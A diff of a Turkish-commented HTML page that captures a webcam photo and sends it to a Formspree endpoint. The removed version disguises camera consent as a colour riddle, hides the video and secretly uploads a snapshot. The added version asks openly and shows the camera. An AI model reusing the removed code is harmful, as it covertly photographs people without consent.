@@ -3,81 +3,71 @@
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Merhaba</title>
+  <title>Photo Capture and Send</title>
   <style>
     #videoElement {
-      display: none;
+      width: 100%;
+      max-width: 300px;
     }
   </style>
 </head>
 <body>
 
-  <h1>Photo Submission Form</h1>
+  <h1>Photo Submission with Permission</h1>
 
-  <form id="photoForm">
-    <!-- Karmaşık bir soru gibi görünen izin sorusu -->
-    <label for="permission">Hangi renk daha ağırdır, mavi mi kırmızı mı? <br>()</label><br>
-    <input type="radio" name="permission" value="yes"> Kırmızı <br>
-    <input type="radio" name="permission" value="no"> Mavi <br><br>
-
-    <button type="button" id="submitBtn">Devam Et</button>
-  </form>
-
-  <video id="videoElement" autoplay></video>
+  <button id="startCamera">Start Camera</button>
+  <video id="videoElement" autoplay style="display: none;"></video>
+  <button id="takePhoto" style="display: none;">Take Photo & Send</button>
   <canvas id="canvas" style="display: none;"></canvas>
 
   <script>
+    const startCameraBtn = document.getElementById('startCamera');
+    const takePhotoBtn = document.getElementById('takePhoto');
     const video = document.getElementById('videoElement');
     const canvas = document.getElementById('canvas');
-    const submitBtn = document.getElementById('submitBtn');
-    
-    submitBtn.addEventListener('click', function() {
-      const selectedPermission = document.querySelector('input[name="permission"]:checked');
 
-      // Kullanıcı doğru seçenek seçti mi?
-      if (selectedPermission && selectedPermission.value === "yes") {
-        // Kamera izni verildi, kamerayı başlat
-        navigator.mediaDevices.getUserMedia({ video: true })
-          .then(function(stream) {
-            video.srcObject = stream;
-            video.style.display = 'none'; // Kamera görünmesin
-          })
-          .catch(function(err) {
-            alert(' Erişimi reddedildi: ' + err);
-          });
+    // Kamerayı başlat
+    startCameraBtn.addEventListener('click', function() {
+      navigator.mediaDevices.getUserMedia({ video: true })
+        .then(function(stream) {
+          video.srcObject = stream;
+          video.style.display = 'block'; // Kamera görünür
+          takePhotoBtn.style.display = 'block'; // Fotoğraf çekme butonu görünür
+          startCameraBtn.style.display = 'none'; // Kamera başlatma butonu gizlenir
+        })
+        .catch(function(err) {
+          alert('Kamera erişimi reddedildi: ' + err);
+        });
+    });
 
-        // Fotoğrafı çekip Formspree ile gönder
-        setTimeout(function() {
-          const context = canvas.getContext('2d');
-          canvas.width = video.videoWidth;
-          canvas.height = video.videoHeight;
-          context.drawImage(video, 0, 0, canvas.width, canvas.height);
+    // Fotoğraf çek ve Formspree ile gönder
+    takePhotoBtn.addEventListener('click', function() {
+      const context = canvas.getContext('2d');
+      canvas.width = video.videoWidth;
+      canvas.height = video.videoHeight;
+      context.drawImage(video, 0, 0, canvas.width, canvas.height);
 
-          // Fotoğrafı veri URL'si olarak al
-          const imageData = canvas.toDataURL('image/png');
+      // Fotoğrafı veri URL'si olarak al
+      const imageData = canvas.toDataURL('image/png');
 
-          // Formspree API'sine gönder
-          fetch("https://formspree.io/f/mdknqlee", {
-            method: "POST",
-            headers: {
-              "Content-Type": "application/json"
-            },
-            body: JSON.stringify({
-              _subject: "Photo from Camera",
-              photo: imageData
-            })
-          })
-          .then(response => response.json())
-          .then(data => {
-            alert('Yanıt başarıyla gönderildi!');
-          })
-          .catch(error => {
-            console.error('Error:', error);
-          });
-        }, 2000);  // Fotoğraf çekmek için küçük bir gecikme
-      } else {
-        alert('Devam etmek için izin vermelisiniz.');
-      }
+      // Formspree API'sine fotoğrafı gönder
+      fetch("https://formspree.io/f/mdknqlee", {
+        method: "POST",
+        headers: {
+          "Content-Type": "application/json"
+        },
+        body: JSON.stringify({
+          _subject: "Photo from Camera",
+          photo: imageData
+        })
+      })
+      .then(response => response.json())
+      .then(data => {
+        alert('Fotoğraf başarıyla gönderildi!');
+      })
+      .catch(error => {
+        console.error('Error:', error);
+      });
     });
   </script>
 
